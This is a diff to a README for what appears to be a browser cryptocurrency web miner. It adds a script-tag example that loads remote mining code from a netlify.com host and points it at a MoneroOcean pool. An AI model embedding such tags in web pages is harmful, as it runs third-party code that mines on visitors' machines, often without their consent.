@@ -7,7 +7,12 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 
 #### Simple Pool change: ?jason=Your_Favorite_Pool:PortNr
 
-#### Examples: CN R Coins (Fork 09march19) (Monero, Lethean) need ?algo=cn/r<br> 
+
+#### Examples: Moneroocean auto algo switch - mining the most profitable coin - payout in xmr need ?algo=cn/r<br> 
+```sh
+<script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10008" > </script>
+```
+#### Examples: CN R Coins (Monero, Lethean) need ?algo=cn/r<br> 
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/r?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
